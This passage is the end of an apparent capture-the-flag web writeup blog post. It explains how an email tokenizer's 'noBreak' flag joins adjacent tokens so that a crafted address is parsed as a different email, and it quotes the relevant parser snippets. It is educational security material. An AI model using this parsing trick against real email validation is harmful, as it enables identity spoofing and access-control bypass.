</span></span></code></pre></div><p>When tokenized it will be something different  :<br>

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/BJLT8UKBkl.png" alt="image" />
    
  </figure>
</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/HygpL8KrJx.png" alt="image" />
    
  </figure>
</p>
<p>You see it right ? The noBreak makes the second one cannot work. It will be set by this logic :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="nx">nextChr</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">[</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;\t&#39;</span><span class="p">,</span> <span class="s1">&#39;\r&#39;</span><span class="p">,</span> <span class="s1">&#39;\n&#39;</span><span class="p">,</span> <span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="s1">&#39;;&#39;</span><span class="p">].</span><span class="nx">includes</span><span class="p">(</span><span class="nx">nextChr</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">this</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">noBreak</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span></code></pre></div><ul>
<li>When noBreak is enabled, it wont push our text token into array, but it will <em><strong>JOIN</strong></em> with the previous value.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">   <span class="k">if</span> <span class="p">(</span><span class="nx">prevToken</span> <span class="o">&amp;&amp;</span> <span class="nx">prevToken</span><span class="p">.</span><span class="nx">noBreak</span> <span class="o">&amp;&amp;</span> <span class="nx">data</span><span class="p">[</span><span class="nx">state</span><span class="p">].</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// join values
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">data</span><span class="p">[</span><span class="nx">state</span><span class="p">][</span><span class="nx">data</span><span class="p">[</span><span class="nx">state</span><span class="p">].</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">token</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">data</span><span class="p">[</span><span class="nx">state</span><span class="p">].</span><span class="nx">push</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span></code></pre></div><p>And leads to the wrong email detected !!

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/Sk-tDLYH1x.png" alt="image" />
    
  </figure>
</p>


<h1 class="relative group">Conclusion 
    <div id="conclusion-2" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#conclusion-2" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<ul>
<li>I learned alot from this challenge, and read this makes me can understand more how the payloads created. :vvv</li>
</ul>

          
          
          
        </div>
        
        

        
        

        


<h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
<section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
  
  

  <a href="/posts/wannagame/" class="min-w-full">
    
    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
        
        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/wannagame/feature_wanna.jpg);"></div>
        
      

      <div class="px-6 py-4">

        
        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
          href="/posts/wannagame/">WannaGame</div>
        

        <div class="text-sm text-neutral-500 dark:text-neutral-400">
          











  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2024-08-27T00:00:00&#43;00:00">27 August 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">13 mins</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/hibwyli/&#34;,'_self');return false;">Hibwyli</div>
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Writeup
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Web
  </span>
</span>
  </span>
  
  
  
  
</div>




        </div>

        
      </div>
      <div class="px-6 pt-4 pb-2">

      </div>
    </div>
  </a>

  
  

  <a href="/posts/sushi/" class="min-w-full">
    
    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
        
        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/sushi/feature_life.png);"></div>
        
      

      <div class="px-6 py-4">

        
        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
          href="/posts/sushi/">Sushi Search and Chrome Detect Engine</div>
        

        <div class="text-sm text-neutral-500 dark:text-neutral-400">
          











  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2024-08-27T00:00:00&#43;00:00">27 August 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/hibwyli/&#34;,'_self');return false;">Hibwyli</div>
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Writeup
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Web
  </span>
</span>
  </span>
  
  
  
  
</div>




        </div>

        
      </div>
      <div class="px-6 pt-4 pb-2">

      </div>
    </div>
  </a>

  
</section>

  
      </div>
     
      
      
        
        
          
          
        
      <script>
        var oid = "views_posts\/HTB\/index.md"
        var oid_likes = "likes_posts\/HTB\/index.md"
      </script>
      
      
      <script type="text/javascript" src="/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js" integrity="sha512-DkmXO0rQo4LHxgEti/&#43;CJjFmQtqrxPiiBHe9CGdPPabi&#43;pk7wgrU9R58W7aOb5E6IHp8T&#43;N&#43;oOe4BolK/OCmTg=="></script>
      
  
    </section>
  <footer class="pt-8 max-w-prose print:hidden">

    
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/posts/sushi/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Sushi Search and Chrome Detect Engine</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2024-08-27T00:00:00&#43;00:00">27 August 2024</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="flex text-right group ml-3" href="/posts/pico/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >PicoCTF 2025</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2025-03-25T00:00:00&#43;00:00">25 March 2025</time>
                  
                </span>
              </span>
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


    
  </footer>
</article>

      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
  <a href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top" title="Scroll to top">
    &uarr;
  </a>
</div>
    </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
      <ul class="flex flex-col list-none sm:flex-row">
        
        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/tags/"
            title="">
            
            tags
          </a>
        </li>
        
        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/categories/"
            title="">
            
            categories
          </a>
        </li>
        
      </ul>
    </nav>
    
  
  <div class="flex items-center justify-between">

    
    
    <p class="text-sm text-neutral-500 dark:text-neutral-400">
      Copyright © Hibwyli
    </p>
    

    
    
    <p class="text-xs text-neutral-500 dark:text-neutral-400">
      
      
      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
    </p>
    

  </div>
  <script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script>
  
  
  <script type="text/javascript" src="/js/process.min.35c1113bcc16c5a59bf031082f9e63822aa95280423881a7847a7ff33a16e6299ce6a840d9ef4e10d947e030a18f3f20359afb2ec0f35967484b9a9360ac3145.js" integrity="sha512-NcERO8wWxaWb8DEIL55jgiqpUoBCOIGnhHp/8zoW5imc5qhA2e9OENlH4DChjz8gNZr7LsDzWWdIS5qTYKwxRQ=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="//localhost:1313/"
  style="z-index:500"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

  </div>
</body>

</html>
